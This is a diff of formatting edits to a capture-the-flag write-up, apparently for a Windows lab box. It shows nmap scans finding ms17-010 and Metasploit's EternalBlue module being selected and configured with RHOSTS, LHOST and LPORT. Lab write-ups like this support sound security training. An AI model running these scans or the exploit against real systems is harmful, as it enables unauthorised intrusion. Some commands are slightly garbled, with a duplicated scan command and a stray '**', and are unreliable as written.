@@ -11,7 +11,7 @@ Has following sequels as Ice and Blaster.
 
 2. How many ports are open with a port number under 1000? - **3**
 	
-Ran a quick scan for the required port range (0-1000). 
+	Ran a quick scan for the required port range (0-1000). 
 
 ```bash
 nmap -vv -p0-1000 -oN nmap/allport_scan.nmap 10.10.130.42**
@@ -30,7 +30,7 @@ PORT    STATE SERVICE      REASON
 445/tcp open  microsoft-ds syn-ack ttl 125
 ```
 \
-Then ran a standard scan - Default services and scripts on the determined specific ports**(135,139,445)** \
+	Then ran a standard scan - Default services and scripts on the determined specific ports**(135,139,445)** \
 
 ```bash
 nmap -vv -p0-1000 -oN nmap/allport_scan.nmap 10.10.130.42
@@ -49,7 +49,7 @@ PORT    STATE SERVICE      REASON          VERSION
 
 3.  What is this machine vulnerable to? - **ms17-010**
 
-Ran a nmap scan for finding the known vulnerabilities. \
+Ran a nmap scan for finding the known vulnerabilities. 
 
 ```bash
 nmap -vv -p135,139,445 --script vuln -oN nmap/vulnub.nmap 10.10.130.42
@@ -96,9 +96,9 @@ $ sudo msfdb run
 msf5 > 
 ```
 
-2. Find the exploitation code we will run against the machine. What is the full path of the code? - **exploit/windows/smb/ms17_010_eternalblue** \
+2. Find the exploitation code we will run against the machine. What is the full path of the code? - **exploit/windows/smb/ms17_010_eternalblue** 
 
-We use the _eternalblue_ one but actually the _psexec_ is the **most stable** verion of the exploit. It should be used in normall scenerios. \
+We use the _eternalblue_ one but actually the _psexec_ is the **most stable** verion of the exploit. It should be used in normall scenerios. 
 
 **OUTPUT**
 
@@ -117,9 +117,9 @@ Matching Modules
 4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
 ```
 
-3. Show options and set the one required value. What is the name of this value? - **RHOSTS** \
+3. Show options and set the one required value. What is the name of this value? - **RHOSTS** 
 
-_RHOSTS_ is the only flag required and not set. One can make additional chages to flags like _LHOST_ and _PAYLOAD_. We set RHOST to $BOX_IP and run the exoplit. I also set my _LPORT_ to 9999. \
+_RHOSTS_ is the only flag required and not set. One can make additional chages to flags like _LHOST_ and _PAYLOAD_. We set RHOST to $BOX_IP and run the exoplit. I also set my _LPORT_ to 9999. 
 
 **OUTPUT**
 ```bash
